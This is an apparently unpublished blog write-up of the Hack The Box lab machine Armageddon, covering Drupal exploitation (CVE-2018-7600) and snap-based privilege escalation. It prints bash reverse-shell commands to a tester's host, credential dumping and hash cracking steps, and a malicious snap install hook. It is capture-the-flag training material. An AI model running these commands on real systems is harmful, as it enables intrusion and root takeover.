---
title:  "Hack The Box - Armageddon"
description: This is the one blog post to rule them all
categories: [drupal, snap, cve-2018-7600]
tags: [Hackthebox, Infosec, Linux] 
imageid: /assets/images/armageddon/Pasted image 20210424223946.png
published: false
---
![](/assets/images/armageddon/Pasted image 20210424223946.png#thumbnail)

this box very straigh forward from foothold because only 2 ports open contains ssh and http. Protocol HTTP based on Drupal on target site include robots.txt, so im gonna put this on nikto for finding vulnerable. If needed im going to find version for drupal. Or you can use `whatweb` command for definition site, sometimes this tools revealed an information.

## Portscan
---
```sql
22/tcp open  ssh
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to  Armageddon |  Armageddon
```


## Reconaissance
---
after doing research i found in this link `http://10.10.10.233//profiles/testing/modules/drupal_system_listing_compatible_test/drupal_system_listing_compatible_test.info`, this link contains what version this target used.

![](/assets/images/armageddon/Pasted image 20210422142322.png)


Exploit patched on CVE-2018-7600 with Exec code as flaws, you can read this information in [here](https://www.cvedetails.com/cve/CVE-2018-7600/). Before reverse shell im gonna check it using exploit that you can find [here](https://github.com/pimps/CVE-2018-7600) with command ping and combine with tcpdump tools for catch hit back from target.

![](/assets/images/armageddon/Pasted image 20210422143546.png)

after get hit back from target, prepare for reverse shell using bash or something else but firstly im doing bash for reverse back. here's command below for execution :

`python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c "bash -i >& /dev/tcp/10.10.14.95/9000 0>&1"`

![](/assets/images/armageddon/Pasted image 20210422144019.png)

after long research finally i found a password on settings.php drupal or you can searching on google about this file, i used mysqldump command for getting the output file then sending into webserver for further analyze this file.

![](/assets/images/armageddon/Pasted image 20210422152959.png)

this below my dump sql file, long short story i able to found the salt password for user brucetherealadmin, you can check on /etc/passwd for this user.

![](/assets/images/armageddon/Pasted image 20210422155300.png)

here's the salt password :

![](/assets/images/armageddon/Pasted image 20210422155643.png)

using johntheripper will revealed the password

![](/assets/images/armageddon/Pasted image 20210422155746.png)

from now we able to login via SSH and grab user.txt.
![](/assets/images/armageddon/Pasted image 20210422155846.png)

## Privilege Escalation
---

run sudo command will determine how to gain root access.
![](/assets/images/armageddon/Pasted image 20210422160117.png)

For doing this escalation basiclly we need to build package using [fpm](https://github.com/jordansissel/fpm) , this tool make it us easy to generate native package such as deb,snap,etc.

you can install it with list command below

```bash
gem install fpm
```

this script below only execute on host, im gonna use target to execute my payload and give shell back into host.

```bash
mkdir -p meta/hooks
echo "bash /dev/shm/unknown" >> /meta/hooks/install
chmod +x meta/hooks/install
fpm -n unknown dir -t snap -a all meta
```

![](/assets/images/armageddon/Pasted image 20210422175834.png)

now on target make a payload with reverse using bash script and makesure listener already start.

```bash
#in terminal
cd /dev/shm
echo bash -i >& /dev/tcp/10.10.14.95/9001 0>&1" > unknown
```

last but not least you have to send this malicious package into target and you will be get hit back as root.

This command below will installed the package using snape.

```bash
sudo snap install unknown_1.0_all.snap --devmode --dangerous
```

![](/assets/images/armageddon/Pasted image 20210422182851.png)


``

### Referencess
---
```sql
https://www.tenable.com/plugins/was/98559
https://github.com/pimps/CVE-2018-7600
https://gtfobins.github.io/gtfobins/snap/
```